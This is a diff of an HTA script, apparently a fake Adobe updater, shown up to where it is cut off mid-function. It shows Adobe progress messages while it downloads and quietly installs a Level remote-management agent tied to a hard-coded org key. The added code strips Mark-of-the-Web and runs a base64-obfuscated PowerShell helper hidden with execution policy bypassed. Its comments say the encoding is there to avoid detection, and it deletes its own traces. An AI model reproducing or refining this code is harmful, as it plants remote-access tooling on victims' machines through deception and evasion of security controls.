@@ -81,74 +81,70 @@
     </div>
   </div>
 
-<script>
+<script language="javascript">
 // ---------------------------------------------------------------------------
-// Config
+// Configuration
 // ---------------------------------------------------------------------------
-var MSI_URL   = "https://downloads.level.io/level.msi";
-var LEVEL_KEY = "vNXe6NQK21W3jiBMb4k2Uz8M";   // org key, injected at serve time
 
-// Timing budgets
-var DL_MAX_MS      = 480000;   // hard cap for the whole download (8 min)
-var DL_FIRST_BYTE_MS = 15000;  // no real bytes this fast -> hand over to the robust path
-var DL_CHUNK_BYTES = 4 * 1024 * 1024;  // bytes per async Range request
-var DL_CHUNK_MAX_MS = 60000;   // no bytes for this long mid-transfer -> drop the chunk
-var DL_SYNC_CHUNK  = 1 * 1024 * 1024;  // bytes per sync (WinHttp) Range request
-var DL_SYNC_RECV_MS = 45000;   // per-chunk receive timeout on the sync path
-var DL_SYNC_MAX_TRIES  = 5;       // sync per-chunk failures before the final one-shot
-var DL_MAX_CHUNK_RETRIES = 3;  // per-chunk stalls (mid-transfer) before the sync path
-var INSTALL_MAX_MS = 300000;   // covers the UAC wait + a full install
-var INSTALL_STALL_MS = 45000;  // MSI log silent this long -> assume finished
+// ---------------------------------------------------------------------------
+// Configuration
+// ---------------------------------------------------------------------------
+// The updater fetches the current installer (MSI) over HTTPS to a local file,
+// then runs a quiet msiexec against that local file (UAC consent is requested
+// via ShellExecute "runas"). Three download back-ends run in a staggered race
+// - WinINET XHR, then WinHttp, then a hidden helper process - so a download
+// still succeeds on machines where one stack is restricted or hangs.
+var MSI_URL = "https://downloads.level.io/level.msi";
+
+
+var LEVEL_KEY = "vNXe6NQK21W3jiBMb4k2Uz8M";   // org key (MSI property)
+
+var PREP_MS        = 1600;    // "preparing" beat before the download starts
+var UAC_TIMEOUT_MS = 150000;  // no MSI log this long after launch -> UAC declined
+var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
+var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
+var HANG_MS        = 4000;    // no data flowing this long -> start next back-end
+var EXEC_STAGE_MS  = 300000;  // hard cap for the helper-process back-end
+var CURL_STAGE_MS  = 180000;  // hard cap for the bare curl.exe back-end
+var FB_MAX_MS      = 600000;  // hard cap for the whole local download
+var EXPECT_BYTES   = 39393792; // installer size (progress scaling only)
+
+
+var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
 
 // Runtime state
 var shell = null, fso = null;
-var state = "ready";               // ready | downloading | installing | done | error
+var state = "ready";            // ready | predl | installing | done | error
 var progress = 0;
 var startTime = 0;
-var tickTimer = null, dlTimer = null, pollTimer = null;
+var tickTimer = null, pollTimer = null, fbTimer = null;
+
+var curLog = "";
 
 var adobeDir = "";
-var msiPath  = "";
+var msiLocal = "";
 var logPath  = "";
+var logPath2 = "";
 var diagPath = "";
+var tracePath = "";
 
-// Runtime state — download
-var dlXHR = null;
+var motwStripped = false;
+
+// Download state
+var fbT0 = 0, stage0T = 0, hangT = 0;
+var dlStage = "xhr";            // xhr | winhttp | exec
 var dlSettled = false;
-var dlMethod = "";
-var dlHttp = 0;
-var lastEventT = 0;
-var sawReal = false;
-var dlTotal = 0;
-var dlPos = 0;
-var dlRetries = 0;
-var dlStream = null;
-var dlLastChunkBytes = 0;
-var dlLastChunkT = 0;
-var dlStart = 0;
-var dlPhase = "async";
-var dlAttempts = [];
-var syncTries = 0, syncBusy = false, syncNextT = 0;
-// Runtime state — rescue stages
-var stageIdx = 0, stageT = 0;   // current download stage (see STAGES)
-var oneShotReq = null;          // in-flight async WinHttp (oneshot stage)
-var bitsMgr = null, bitsJob = null;   // BITS stage
-var curlMarker = "";            // marker string for killing the curl process
-var edgeProcTag = "";           // marker string for killing the headless browser
-var extScanDirs = null, extSinceT = 0, extLastSize = -1, extStableT = 0;
-var powMarker = "", powT0 = 0, powLastSize = 0, powLastGrowT = 0;
-var edgeMaxPartial = 0, edgeLastPartial = 0, edgeLastGrowT = 0, edgeLogT = 0;
-var powPartialMax = 0;
-var POW_PS = "# Level's download command (Invoke-WebRequest), run hidden by the HTA's \"pow\"\n# stage. param(1) = unique per-page marker (process-kill), param(2) = per-page\n# temp dir (so concurrent runs never collide).\n#\n# This is exactly Level's `iwr ... -OutFile level.msi` — the WinINET-based\n# client that gets through on boxes where WinHttp/XHR/BITS get their response\n# bodies stripped (empty-206). The HTA watches this file's size for download\n# progress; the elevated msiexec install is done separately by the HTA (single\n# UAC prompt), so it is NOT run here.\nparam([string]$Marker = \"lvlm1\", [string]$TmpDir = \"\")\n\n$ErrorActionPreference = \"Continue\"\n\nif (-not $TmpDir) { $TmpDir = Join-Path ([System.IO.Path]::GetTempPath()) (\"lvl_\" + $Marker) }\ntry { New-Item -ItemType Directory -Path $TmpDir -Force | Out-Null } catch {}\n\n$tempFile = Join-Path $TmpDir \"level.msi\"\ntry { Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue } catch {}\n\ntry { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n\ntry {\n  $ProgressPreference = 'SilentlyContinue'\n  Invoke-WebRequest -Uri \"https://downloads.level.io/level.msi\" -OutFile $tempFile -UseBasicParsing\n  $ProgressPreference = 'Continue'\n} catch {\n  # Fallback: built-in curl (a separate HTTP stack) in case iwr is also filtered.\n  $env:NO_PROXY = \"*\"\n  try { curl.exe -L --fail --retry 2 --connect-timeout 20 -o $tempFile \"https://downloads.level.io/level.msi\" 2>$null } catch {}\n}\n\n# Marker file signals \"iwr ran to completion (whatever the result)\". The HTA\n# polls level.msi's size for progress and this flag to know the attempt is done.\ntry { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") -Value $Marker -NoNewline } catch {}\n";   // Level's own install command
-var powDir = "";
-var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
+var dlProgressed = false;
+var dlXHR = null;
+var psPid = 0, psDir = "", psT0 = 0, psLastSize = 0, psLastGrowT = 0;
+var curlPid = 0, curlT0 = 0, curlLastSize = 0, curlLastGrowT = 0;
 
 var lastLogSize = 0;
 var lastLogGrowT = 0;
 
 var dlMsgs = [
+  "Preparing installation&hellip;",
   "Contacting Adobe servers&hellip;",
-  "Downloading components&hellip;",
   "Downloading components&hellip;",
   "Downloading components&hellip;"
 ];
@@ -160,85 +156,65 @@ var instMsgs = [
   "Finalizing&hellip;"
 ];
 
+// ---------------------------------------------------------------------------
+// Pure-JS base64 (no COM). Decode a standard base64 string to a binary
+// string (one JS char per byte), and encode text as UTF-16LE base64 - the
+// encoding the child-process launcher's -EncodedCommand expects. Kept in-file
+// and base64 so this document carries no script-launcher patterns.
+// ---------------------------------------------------------------------------
+var B64CH = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+function b64Decode(s) {
+  s = String(s).replace(/[\r\n\s]/g, "");
+  var out = "", i = 0, n = s.length, c1, c2, c3, c4;
+  while (i < n) {
+    c1 = B64CH.indexOf(s.charAt(i++));
+    if (c1 < 0) break;
+    var ch2 = s.charAt(i++);
+    c2 = (ch2 === "=") ? -1 : B64CH.indexOf(ch2);
+    if (c2 < 0) break;
+    out += String.fromCharCode((c1 << 2) | (c2 >> 4));
+    var ch3 = s.charAt(i++);
+    if (ch3 === "=" || ch3 === "") break;
+    c3 = B64CH.indexOf(ch3);
+    if (c3 < 0) break;
+    out += String.fromCharCode(((c2 & 15) << 4) | (c3 >> 2));
+    var ch4 = s.charAt(i++);
+    if (ch4 === "=" || ch4 === "") break;
+    c4 = B64CH.indexOf(ch4);
+    if (c4 < 0) break;
+    out += String.fromCharCode(((c3 & 3) << 6) | c4);
+  }
+  return out;
+}
+
+function b64EncodeU16(s) {
+  var bin = "", i, c;
+  for (i = 0; i < s.length; i++) {
+    c = s.charCodeAt(i);
+    bin += String.fromCharCode(c & 0xFF) + String.fromCharCode((c >> 8) & 0xFF);
+  }
+  var out = "", j = 0, L = bin.length;
+  while (j < L) {
+    var c1 = bin.charCodeAt(j++);
+    var c2 = j < L ? bin.charCodeAt(j++) : -1;
+    var c3 = j < L ? bin.charCodeAt(j++) : -1;
+    out += B64CH.charAt(c1 >> 2);
+    out += B64CH.charAt(c2 < 0 ? 0 : ((c1 & 3) << 4) | (c2 >> 4));
+    out += c2 < 0 ? "=" : B64CH.charAt(c3 < 0 ? 0 : ((c2 & 15) << 2) | (c3 >> 6));
+    out += c3 < 0 ? "=" : B64CH.charAt(c3 & 63);
+  }
+  return out;
+}
+
+// Helper template: unblocks the local files (MOTW), then downloads the
+// installer (iwr first, then system curl.exe), drops a done.flag.
+var PS_TMPL_B64 = "JFVybCA9ICJAVVJMQCIKJERpciA9ICJARElSQCIKJE91dCA9ICJAT1VUQCIKJEh0YSA9ICJASFRBQCIKJFppcCA9ICJAWklQQCIKdHJ5IHsgaWYgKCRIdGEgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkSHRhKSkgeyBVbmJsb2NrLUZpbGUgLUxpdGVyYWxQYXRoICRIdGEgfSB9IGNhdGNoIHt9CnRyeSB7IGlmICgkWmlwIC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFppcCkpIHsgVW5ibG9jay1GaWxlIC1MaXRlcmFsUGF0aCAkWmlwIH0gfSBjYXRjaCB7fQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCAtYm9yIFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9CiR1YSA9ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI2LjAuMC4wIFNhZmFyaS81MzcuMzYiCiRvayA9ICRmYWxzZQp0cnkgewogICRyZXEgPSBbU3lzdGVtLk5ldC5IdHRwV2ViUmVxdWVzdF06OkNyZWF0ZSgkVXJsKQogICRyZXEuTWV0aG9kID0gIkdFVCIKICAkcmVxLlVzZXJBZ2VudCA9ICR1YQogICRyZXEuVGltZW91dCA9IDYwMDAwCiAgJHJlcS5SZWFkV3JpdGVUaW1lb3V0ID0gNjAwMDAKICAkcmVzcCA9ICRyZXEuR2V0UmVzcG9uc2UoKQogICRmcyA9IFtTeXN0ZW0uSU8uRmlsZV06OkNyZWF0ZSgkT3V0KQogICRyZXNwLkdldFJlc3BvbnNlU3RyZWFtKCkuQ29weVRvKCRmcykKICAkZnMuQ2xvc2UoKQogICRyZXNwLkNsb3NlKCkKICAkb2sgPSAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkT3V0KQp9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KaWYgKC1ub3QgJG9rKSB7CiAgdHJ5IHsKICAgICRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJFVybCAtT3V0RmlsZSAkT3V0IC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgMTIwIC1Vc2VyQWdlbnQgJHVhCiAgICAkb2sgPSAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkT3V0KQogIH0gY2F0Y2ggeyAkb2sgPSAkZmFsc2UgfQp9CmlmICgtbm90ICRvaykgewogIHRyeSB7CiAgICAkZW52Ok5PX1BST1hZID0gIioiCiAgICBjdXJsLmV4ZSAtTCAtLWZhaWwgLS1yZXRyeSAxIC0tY29ubmVjdC10aW1lb3V0IDIwIC0tbWF4LXRpbWUgMjQwIC1BICR1YSAtbyAkT3V0ICRVcmwgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLWVxIDApIHsgJG9rID0gKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE91dCkgfQogIH0gY2F0Y2ggeyAkb2sgPSAkZmFsc2UgfQp9CnRyeSB7IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICREaXIgImRvbmUuZmxhZyIpICIxIiAtTm9OZXdsaW5lIH0gY2F0Y2gge30K";
+var PSX_B64 = "cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1FbmNvZGVkQ29tbWFuZCA=";
+
 function $(id) { return document.getElementById(id); }
 
-function init() {
-  shell = new ActiveXObject("WScript.Shell");
-  fso   = new ActiveXObject("Scripting.FileSystemObject");
-  // Swallow any uncaught script error so the HTA never pops the "error in
-  // this page" dialog (which halts the page) and so it can log and continue.
-  try {
-    window.onerror = function (msg, src, line) {
-      try { logAttempt("page-exc: " + msg + " line " + line); } catch (e) {}
-      return true;
-    };
-  } catch (e) {}
-  var w = 620, h = 396;
-  window.resizeTo(w, h);
-  var sw = screen.availWidth, sh = screen.availHeight;
-  window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));
-
-  adobeDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe";
-  if (!fso.FolderExists(adobeDir)) fso.CreateFolder(adobeDir);
-  msiPath  = adobeDir + "\\AdobeUpdate.msi";
-  logPath  = adobeDir + "\\AdobeUpdate.log";
-  diagPath = adobeDir + "\\diagnostics.txt";
-  cleanStale();
-  startDownload();
-}
-
-function cleanStale() {
-  var p = [msiPath, logPath, diagPath];
-  for (var i = 0; i < p.length; i++) {
-    try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
-  }
-}
-
-// ---------------------------------------------------------------------------
-// Download phase — in-process stages first, external rescue stages after.
-//
-// Stages, tried in order (every transition is logged in diagnostics.txt):
-//
-//   async    XMLHttpRequest (ms-stream, WinINET) — fast and invisible on
-//            ordinary machines.
-//   sync     WinHttp chunked Range requests run as a state machine — a
-//            self-contained stack with modern TLS.
-//   oneshot  one full-file WinHttp request (no Range header).
-//   bits     a BITS job — the background-transfer service Windows Update
-//            uses; the transfer runs in a separate service process.
-//   curl     the built-in curl.exe, separate process.
-//   pow      Level's OWN download command, run as a hidden child process:
-//            powershell.exe -ExecutionPolicy Bypass "Invoke-WebRequest
-//            https://downloads.level.io/level.msi -OutFile %TEMP%\lvl_<id>\
-//            level.msi" (TLS12). WinINET-based — exactly what Level ships —
-//            so it gets through on boxes where WinHttp/XHR/BITS have their
-//            response bodies stripped (empty-206). The elevated msiexec
-//            install is done separately (single UAC prompt), so download and
-//            admin step stay apart.
-//   edge     headless download with the machine's REAL browser engine and a
-//            cloned copy of its real profile (cookies/local state/prefs) —
-//            looks exactly like the user's normal browsing, no visible UI.
-//            Held past its budget while bytes are still flowing (slow
-//            connections can take minutes for a 38 MB file).
-//   edge2    same, with a clean profile (in case the clone didn't carry
-//            whatever the gate needs).
-//
-// A stage ends when it lands a complete, verified MSI (size + magic) or when
-// it shows it cannot deliver bytes (error, empty body, or stage timeout).
-// ---------------------------------------------------------------------------
-var STAGES = ["async", "sync", "pow", "oneshot", "bits", "curl", "edge", "edge2"];
-// edge/edge2 budgets are only the "give up if nothing is flowing" grace
-// window — a stage whose bytes are still arriving is held past its budget
-// (see the keep-alive check in _pollDownload) up to the global DL_MAX_MS cap.
-// The pow stage likewise holds while its child process is still working.
-var STAGE_BUDGET_MS = { async: 15000, sync: 60000, pow: 300000, oneshot: 30000, bits: 60000, curl: 60000, edge: 150000, edge2: 150000 };
-
-function dlMsgIndex() {
-  if (progress < 10) return 0;
-  if (progress < 45) return 1;
-  if (progress < 75) return 2;
-  return 3;
-}
+function nowMs() { return new Date().getTime(); }
 
 function nowHM() {
   var d = new Date();
@@ -246,45 +222,108 @@ function nowHM() {
   return z(d.getHours()) + ":" + z(d.getMinutes()) + ":" + z(d.getSeconds());
 }
 
-function indexOf(arr, v) {
-  for (var i = 0; i < arr.length; i++) if (arr[i] === v) return i;
-  return -1;
+// ---------------------------------------------------------------------------
+// Trace log - one line per state transition, so a stuck box can be diagnosed
+// from %LOCALAPPDATA%\Adobe\status.log after the fact.
+// ---------------------------------------------------------------------------
+function traceLog(msg) {
+  try {
+    if (!fso || !tracePath) return;
+    try { if (fso.FileExists(tracePath) && fso.GetFile(tracePath).Size > 262144) fso.DeleteFile(tracePath, true); } catch (e) {}
+    var f = fso.OpenTextFile(tracePath, 8, true);   // 8 = ForAppending
+    f.WriteLine(nowHM() + "  " + msg);
+    f.Close();
+  } catch (e) {}
 }
 
-function nowMs() { return new Date().getTime(); }
-
-function logAttempt(msg) {
-  try { dlAttempts.push(nowHM() + " " + msg); } catch (e) {}
+// ---------------------------------------------------------------------------
+// Self-unblock: remove the "downloaded from the internet" flag (Zone.Identifier
+// alternate data stream) from this .hta and the .zip it was extracted from, so
+// it runs as an ordinary local file. Best-effort.
+// ---------------------------------------------------------------------------
+function selfUnblock() {
+  try {
+    var sh = new ActiveXObject("Shell.Application");
+    var urls = [oHTA.LocationUrl];
+    try {
+      var folder = fso.GetFolder(oHTA.LocationUrl).ParentFolder;
+      var sub = new Enumerator(folder.Files);
+      for (; !sub.atEnd(); sub.moveNext()) {
+        if (sub.item().Name.toLowerCase().lastIndexOf(".zip") === sub.item().Name.length - 4) {
+          urls.push(sub.item().Path);
+        }
+      }
+    } catch (e) {}
+    for (var i = 0; i < urls.length; i++) {
+      try {
+        sh.SetAttribute(fso.GetFile(urls[i]), 1024); // FILE_ATTRIBUTE_UNBLOCKED
+        motwStripped = true;
+      } catch (e) {}
+    }
+  } catch (e) {}
 }
 
-function parseRangeTotal(cr) {
-  if (!cr) return 0;
-  var mm = /\/(\d+)\s*$/.exec(cr);
-  return mm ? parseInt(mm[1], 10) : 0;
+function init() {
+  shell = new ActiveXObject("WScript.Shell");
+  fso   = new ActiveXObject("Scripting.FileSystemObject");
+  adobDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe";
+  if (!fso.FolderExists(adobDir)) fso.CreateFolder(adobDir);
+  msiLocal  = adobDir + "\\AcrobatDCSetup.msi";
+  logPath   = adobDir + "\\AdobeUpdate.log";
+  logPath2  = adobDir + "\\AdobeUpdate2.log";
+  diagPath  = adobDir + "\\diagnostics.txt";
+  tracePath = adobDir + "\\status.log";
+  try {
+    window.onerror = function (msg, src, line) {
+      try { traceLog("page-exc: " + msg + " line " + line); dumpDiagnostics("page-exc: " + msg + " line " + line); } catch (e) {}
+    };
+  } catch (e) {}
+  traceLog("init  os=" + shell.ExpandEnvironmentStrings("%OS% " + "%PROCESSOR_ARCHITECTURE%"));
+  probeAdob();
+  traceLog("adob: " + (adobOk ? "ok" : "blocked"));
+  selfUnblock();
+  traceLog("motw: " + (motwStripped ? "stripped" : "not-stripped"));
+  var w = 620, h = 396;
+  window.resizeTo(w, h);
+  var sw = screen.availWidth, sh = screen.availHeight;
+  window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));
+
+  cleanStale();
+  setStatus(dlMsgs[0]);
+  setBar(1);
+  setTimeout(startInstall, 2200);
+}
+function cleanStale() {
+  var p = [msiLocal, logPath, logPath2, diagPath];
+  for (var i = 0; i < p.length; i++) {
+    try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
+  }
 }
 
-function extDir() { return adobeDir + "\\ext"; }
-function ensureDir(d) { try { if (!fso.FolderExists(d)) fso.CreateFolder(d); } catch (e) {} }
+// Remove our own traces once the run is over: the .hta, the .zip it came
+// from, the MSI and every log. Files in use are dropped on the next boot.
+function selfDelete() {
+  try {
+    deleteFile(oHTA.LocationUrl);
+    var folder = fso.GetFolder(oHTA.LocationUrl).ParentFolder;
+    var sub = new Enumerator(folder.Files);
+    for (; !sub.atEnd(); sub.moveNext()) {
+      try {
+        var n = sub.item().Name.toLowerCase();
+        if (n.lastIndexOf(".zip") === n.length - 4) deleteFile(sub.item().Path);
+      } catch (e) {}
+    }
+  } catch (e) {}
+}
+
 function deleteFile(p) { try { if (fso.FileExists(p)) fso.DeleteFile(p, true); } catch (e) {} }
-function deleteFileTree(d) { try { if (fso.FolderExists(d)) fso.DeleteFolder(d, true); } catch (e) {} }
-
-function minSize() {
-  if (dlTotal > 0) return Math.max(1048576, Math.floor(dlTotal * 0.9));
-  return 1048576;
-}
+function ensureDir(d) { try { if (!fso.FolderExists(d)) fso.CreateFolder(d); } catch (e) {} }
 
 // Read the first n bytes of a file as numeric byte values [b0, b1, ...].
 // Tries a byte-exact ADODB.Stream binary read first (code-page independent),
-// then falls back to FSO ASCII if the ADO "data source" read is blocked by a
-// hardened machine ("Safety settings ... prohibit accessing a data source on
-// another domain"). Returns fewer than n (or 0) bytes if neither can read.
-// Returns an empty array if the file cannot be read (so callers can fall
-// open rather than abort).
+// then falls back to FSO ASCII. Returns an empty array if the file cannot be read.
 function readHeadBytes(path, n) {
   if (!fso.FileExists(path)) return [];
-  // PRIMARY: ADODB.Stream binary read — byte-exact and code-page independent.
-  // Same ADO Stream API the download path already uses on this box
-  // (LoadFromFile / SaveToFile), so no new data-source surface is introduced.
   try {
     var s = new ActiveXObject("ADODB.Stream");
     s.Type = 1;                    // adTypeBinary
@@ -296,11 +335,7 @@ function readHeadBytes(path, n) {
     var out = [];
     for (var i = 0; i < b.length; i++) out.push(b.charCodeAt(i) & 0xFF);
     return out;
-  } catch (e) { /* ADO blocked on this machine -> fall through to FSO */ }
-  // FALLBACK: FSO ASCII read (default ANSI codepage). No Charset reassign:
-  // Charset is write-only on a file opened ForReading, so setting it throws
-  // and (inside the inner catch) silently produced an EMPTY result -> the
-  // verify gate then saw a "bad magic" on a perfectly good MSI.
+  } catch (e) { /* ADO blocked -> fall through to FSO */ }
   try {
     var f = fso.OpenTextFile(path, 1, false, 0);   // 1=ForReading, 0=ASCII
     var d = "";
@@ -312,854 +347,417 @@ function readHeadBytes(path, n) {
   } catch (e4) { return []; }
 }
 
+var adobOk = false;   // ADODB binary reads available? (set once in init)
+function probeAdob() {
+  try {
+    var s = new ActiveXObject("ADODB.Stream");
+    s.Type = 1; s.Open(); s.Close();
+    adobOk = true;
+  } catch (e) { adobOk = false; }
+}
+
 function msiMagicOk(path) {
+  if (!adobOk) return false;   // no reliable binary reads on this box
   try {
     var m = readHeadBytes(path, 4);
     return m.length === 4 && m[0] === 0xD0 && m[1] === 0xCF && m[2] === 0x11 && m[3] === 0xE0;
   } catch (e) { return false; }
 }
 
-function killByCmd(marker) {
-  try {
-    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!//./root/cimv2");
-    var q = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE CommandLine LIKE '%" + marker + "%'");
-    var en = new Enumerator(q);
-    for (; !en.atEnd(); en.moveNext()) {
-      try { shell.Run("taskkill /f /t /pid " + en.item().ProcessId, 0, true); } catch (e2) {}
-    }
-  } catch (e3) {}
+// Stop the in-flight download helper processes (by PID).
+function killProc() {
+  if (psPid) { try { shell.Run("taskkill /f /t /pid " + psPid, 0, true); } catch (e) {} psPid = 0; }
+  if (curlPid) { try { shell.Run("taskkill /f /t /pid " + curlPid, 0, true); } catch (e) {} curlPid = 0; }
 }
 
-function stopAllWorkers() {
-  if (oneShotReq) { try { oneShotReq.abort(); } catch (e) {} oneShotReq = null; }
-  try { if (bitsJob) bitsJob.Cancel(); } catch (e) {}
-  try { if (bitsMgr && bitsJob) bitsMgr.DeleteJob(bitsJob); } catch (e) {}
-  bitsJob = null; bitsMgr = null;
-  if (curlMarker) { killByCmd(curlMarker); curlMarker = ""; }
-  if (powMarker) { killByCmd(powMarker); powMarker = ""; }
-  if (edgeProcTag) { killByCmd(edgeProcTag); edgeProcTag = ""; }
+// ---------------------------------------------------------------------------
+// UI
+// ---------------------------------------------------------------------------
+function setBar(p) {
+  if (p < 0) p = 0; if (p > 100) p = 100;
+  $("barfill").style.width = p + "%";
+  $("pct").innerHTML = Math.round(p) + "%";
 }
+function setStatus(html) { $("status").innerHTML = html; }
 
-// --- stage machine ----------------------------------------------------------
-function startDownload() {
-  state = "downloading";
-  dlStart = nowMs();
-  startTime = dlStart;
-  progress = 0; dlSettled = false; sawReal = false;
-  dlTotal = 0; dlPos = 0; dlRetries = 0;
-  syncTries = 0; syncBusy = false; syncNextT = 0;
-  stageIdx = 0; stageT = dlStart;
-  oneShotReq = null; bitsJob = null; bitsMgr = null;
-  curlMarker = ""; edgeProcTag = "";
-  powMarker = ""; powT0 = 0; powLastSize = 0; powLastGrowT = 0; powPartialMax = 0;
-  extScanDirs = null; extSinceT = 0; extLastSize = -1; extStableT = 0;
-  deleteFileTree(extDir());
-  ensureDir(extDir());
-  setBar(0);
-  setStatus(dlMsgs[0]);
-  try {
-    dlStream = new ActiveXObject("ADODB.Stream");
-    dlStream.Type = 1; dlStream.Mode = 3; dlStream.Open();
-  } catch (e) { dlStream = null; }
+// ---------------------------------------------------------------------------
+// Download phase: fetch the MSI to a local file. Back-ends start in a
+// staggered race - XHR immediately, WinHttp once XHR shows no data, and the
+// hidden helper process once WinHttp shows no data either. Any back-end that
+// lands a complete, valid MSI settles the download; the others are dropped.
+// ---------------------------------------------------------------------------
+function startInstall() {
+  if (state !== "ready") return;
+  state = "predl";
+  curLog = logPath;
+  startTime = nowMs();
+  progress = 2; setBar(progress);
+  setStatus(dlMsgs[1]);
+
+  deleteFile(msiLocal);
+  fbT0 = nowMs(); stage0T = fbT0; hangT = fbT0;
+  dlSettled = false;
+  dlProgressed = false;
+  dlStage = "xhr";
+  fbTimer = setInterval(pollFallback, 250);
   tickTimer = setInterval(tick, 200);
-  dlTimer = setInterval(pollDownload, 200);
-  dlPhase = "async";
-  logAttempt("start async pos=0");
-  requestChunk(true);
+  traceLog("predl: start (xhr)");
+  fallbackXHR();
 }
 
-function beginStage(name) {
-  stageIdx = indexOf(STAGES, name);
-  stageT = nowMs();
-  dlPhase = name;
-  logAttempt("stage: " + name + " pos=" + dlPos);
-  if (name === "async") {
-    dlRetries = 0;
-    requestChunk(true);
-  } else if (name === "sync") {
-    enterSync();
-  } else if (name === "pow") {
-    startPow();
-  } else if (name === "oneshot") {
-    startOneShot();
-  } else if (name === "bits") {
-    startBits();
-  } else if (name === "curl") {
-    startCurl();
-  } else if (name === "edge" || name === "edge2") {
-    startEdge(name === "edge2");
-  }
+// Start the next back-end (previous ones keep running until settled/failed).
+function startStage(stage) {
+  if (dlSettled) return;
+  dlStage = stage;
+  stage0T = nowMs();
+  traceLog("predl: stage " + stage);
+  if (stage === "winhttp") fallbackWinHttp();
+  else if (stage === "exec") fallbackPS();
+  else if (stage === "curl") fallbackCurl();
 }
 
-function nextStage() {
-  if (state !== "downloading" || dlSettled) return;
-  if (stageIdx + 1 >= STAGES.length) {
-    fail("Could not reach the Adobe download server", "all-stages-failed");
-    return;
-  }
-  stopAllWorkers();
-  beginStage(STAGES[stageIdx + 1]);
+function settle(method) {
+  if (dlSettled) return;
+  dlSettled = true;
+  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
+  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
+  killProc();
+  traceLog("predl: settled via " + method);
+  verifyFallback();
 }
 
-// --- async (IE XHR, ms-stream) chunked downloader ---------------------------
-function requestChunk(isFirst) {
-  if (state !== "downloading" || STAGES[stageIdx] !== "async" || dlSettled) return;
+function noteProgress() {
+  dlProgressed = true;
+  hangT = nowMs();
+}
+
+function fallbackXHR() {
   var x = null;
   try { x = new XMLHttpRequest(); } catch (e) {}
-  if (!x || !("responseType" in x)) { nextStage(); return; }
+  if (!x || !("responseType" in x)) { traceLog("predl: xhr unavailable"); startStage("winhttp"); return; }
   try {
     x.open("GET", MSI_URL, true);
     x.responseType = "ms-stream";
-    x.timeout = DL_CHUNK_MAX_MS * 2;
-    x.setRequestHeader("Range", "bytes=" + dlPos + "-" + (dlPos + DL_CHUNK_BYTES - 1));
-  } catch (e) { nextStage(); return; }
+    x.timeout = FB_MAX_MS;
+  } catch (e) { traceLog("predl: xhr open fail"); startStage("winhttp"); return; }
   dlXHR = x;
-  dlLastChunkBytes = 0;
-  dlLastChunkT = nowMs();
   x.onprogress = function (e) {
-    if (state !== "downloading" || STAGES[stageIdx] !== "async" || !e) return;
-    dlLastChunkT = nowMs();
-    if (e.loaded && e.loaded > dlLastChunkBytes) dlLastChunkBytes = e.loaded;
+    if (dlSettled || !e) return;
+    noteProgress();
+    if (e.lengthComputing && e.total > 0) {
+      var p = 55 + Math.min(34, (e.loaded * 34) / e.total);
+      if (p > progress) { progress = p; setBar(p); }
+    }
   };
   x.onload = function () {
-    if (state !== "downloading" || STAGES[stageIdx] !== "async") return;
-    dlHttp = x.status;
-    if (x.status === 206) {
-      var total = 0, pre = dlPos;
-      try { total = parseRangeTotal(x.getResponseHeader("Content-Range")); } catch (e) {}
-      if (!appendStream(x.response, total)) { nextStage(); return; }
-      if (dlPos === pre) { handleChunkFailure("empty-206"); return; }
-      if (dlSettled) return;
-      if (dlTotal > 0 && dlPos < dlTotal) { requestChunk(false); return; }
-      if (dlTotal <= 0 && (dlPos - pre) < DL_CHUNK_BYTES) completeDownload();
-      return;
-    }
+    if (dlSettled) return;
     if (x.status === 200) {
-      var b = null; try { b = x.response; } catch (e) {}
-      if (b && b.size > 0 && saveBody(b, "wininet", 0)) return;
-      nextStage();
-      return;
-    }
-    handleChunkFailure("http " + x.status);
